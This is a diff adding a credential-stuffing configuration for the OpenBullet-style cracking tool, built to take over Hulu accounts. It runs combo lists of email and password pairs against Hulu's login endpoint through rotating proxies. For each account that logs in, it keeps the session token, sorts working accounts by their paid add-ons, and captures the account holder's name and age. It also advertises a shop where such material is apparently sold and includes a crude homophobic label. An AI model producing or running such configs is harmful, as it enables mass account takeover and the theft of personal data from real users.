@@ -1,0 +1,86 @@
+[SETTINGS]
+{
+  "Name": "HuLu By IpProxeis",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-12T13:59:41.7940691+01:00",
+  "AdditionalInfo": "",
+  "Author": "IpProxeis",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://auth.hulu.com/v1/device/password/authenticate" 
+  CONTENT "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=<PASS>&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CHECK KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "user_token" 
+  KEYCHAIN Failure OR 
+    KEY "Your login is invalid. Please try again.\"" 
+
+#Token PARSE "<SOURCE>" LR "\",\"user_token\":\"" "\"" -> VAR "Token" 
+
+#GET_DATA REQUEST GET "https://home.hulu.com/v1/users/self" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+#CHECK_AGAIN KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "subscription\":{\"id" 
+  KEYCHAIN Failure OR 
+    KEY "status\":null,\"subscriber_id" 
+    KEY "\"status\":\"6\",\"subscriber_id\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "package_ids\":[],\"" 
+    KEY "package_ids\":[\"1\",\"2\"],\"" 
+
+#Captuer PARSE "<SOURCE>" LR "package_ids\":[\"1\",\"2\"," "]" -> VAR "sub" 
+
+#https://shoppy.gg/@IpMarket FUNCTION Replace "\"14\"" "No Commercials" "<sub>" -> VAR "sub" 
+
+#https://shoppy.gg/@IpMarket FUNCTION Replace "\"16\"" "Live TV" "<sub>" -> VAR "sub" 
+
+#https://shoppy.gg/@IpMarket FUNCTION Replace "\"15\"" "Showtime" "<sub>" -> VAR "sub" 
+
+#https://shoppy.gg/@IpMarket FUNCTION Replace "\"17\"" "HBO" "<sub>" -> VAR "sub" 
+
+#https://shoppy.gg/@IpMarket FUNCTION Replace "\"18\"" "Cinemax" "<sub>" -> VAR "sub" 
+
+#https://shoppy.gg/@IpMarket FUNCTION Replace "\"19\"" "STARZ" "<sub>" -> VAR "sub" 
+
+#https://shoppy.gg/@IpMarket FUNCTION Replace "\"21\"" "You are a gay xD" "<sub>" -> VAR "sub" 
+
+#IP PARSE "<sub>" JSON "" -> CAP "Sub To" 
+
+#Proxeis PARSE "<SOURCE>" LR "\",\"name\":\"" "\"," -> CAP "Name" 
+
+#Enjoy PARSE "<SOURCE>" LR "\",\"age\":" ",\"" -> CAP "Age" "" "  ^^By:IpProxeis" 
+
